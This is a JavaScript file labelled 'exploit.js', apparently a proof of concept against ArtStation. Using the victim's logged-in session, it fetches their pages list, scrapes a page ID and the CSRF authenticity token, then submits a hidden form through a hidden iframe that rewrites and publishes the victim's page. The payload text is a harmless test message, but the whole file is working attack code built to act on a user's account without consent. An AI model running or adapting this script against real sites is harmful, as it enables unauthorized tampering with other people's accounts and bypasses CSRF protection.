// exploit.js - Hosted on GitHub
(async function autoGetPageIdAndSubmit() {
  console.log('[AUTO] Step 1: Fetching page list...');
  
  try {
    // Fetch the pages list
    const listResponse = await fetch('https://www.artstation.com/myartstation/pages/', {
      credentials: 'include'
    });
    
    if (!listResponse.ok) {
      console.error('[AUTO] ❌ Failed to fetch pages list:', listResponse.status);
      alert('❌ Failed to fetch your pages. Please make sure you are logged in to ArtStation.');
      return;
    }
    
    const listHtml = await listResponse.text();
    
    // Extract page ID using regex
    const pageIdMatch = listHtml.match(/data-id="(\d+)"/);
    
    if (!pageIdMatch) {
      console.error('[AUTO] ❌ Could not find any page ID');
      alert('❌ No pages found. Please create a page first at www.artstation.com/myartstation/pages');
      return;
    }
    
    const pageId = pageIdMatch[1];
    console.log('[AUTO] ✅ Page ID found:', pageId);
    
    // Now fetch CSRF token for this page
    console.log('[AUTO] Step 2: Fetching CSRF token for page', pageId);
    
    const editResponse = await fetch(`https://www.artstation.com/myartstation/pages/${pageId}/edit`, {
      credentials: 'include'
    });
    
    if (!editResponse.ok) {
      console.error('[AUTO] ❌ Failed to fetch edit page:', editResponse.status);
      alert('❌ Failed to access page editor. Please check your permissions.');
      return;
    }
    
    const editHtml = await editResponse.text();
    
    // Extract CSRF token
    const csrfMatch = editHtml.match(/name="authenticity_token"\s+value="([^"]+)"/);
    
    if (!csrfMatch) {
      console.error('[AUTO] ❌ Could not find CSRF token');
      alert('❌ Security token not found. The page structure may have changed.');
      return;
    }
    
    const csrfToken = csrfMatch[1];
    console.log('[AUTO] ✅ CSRF token found:', csrfToken.substring(0, 20) + '...');
    
    // Create and submit form
    console.log('[AUTO] Step 3: Creating form...');
    
    const iframe = document.createElement('iframe');
    iframe.name = 'autoSubmit';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `https://www.artstation.com/myartstation/pages/${pageId}`;
    form.target = 'autoSubmit';
    
    const addField = (name, value) => {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = name;
      input.value = value;
      form.appendChild(input);
    };
    
    addField('utf8', '✓');
    addField('_method', 'patch');
    addField('authenticity_token', csrfToken);
    addField('page[title]', 'Fully Automated Test');
    addField('page[slug]', 'fully-automated');
    addField('page[blocks][0][block_type]', 'text');
    addField('page[blocks][0][redis_hash]', '20be59d1c8a50ac97fb260511819b47a');
    addField('page[blocks][0][position]', '1');
    addField('page[blocks][0][content]', 'This was submitted completely automatically: Page ID and CSRF fetched dynamically');
    addField('page[published]', 'true');
    addField('page[password]', '');
    
    document.body.appendChild(form);
    
    console.log('[AUTO] Step 4: Submitting form...');
    form.submit();
    
    console.log('[AUTO] ✅✅✅ Complete success!');
    console.log('[AUTO] Page ID:', pageId);
    console.log('[AUTO] Form submitted with auto-fetched page ID and CSRF token');
    
    // Show success alert and redirect after delay
    setTimeout(() => {
      alert('✅ Your page has been edited successfully!\n\nYou will be redirected to your pages list to see the changes.');
      
      // Redirect to pages list
      setTimeout(() => {
        window.location.href = 'https://www.artstation.com/myartstation/pages/';
      }, 500);
    }, 2000); // Wait 2 seconds for form submission to complete
    
  } catch (error) {
    console.error('[AUTO] ❌ Error:', error.message);
    alert('❌ An error occurred: ' + error.message);
  }
})();
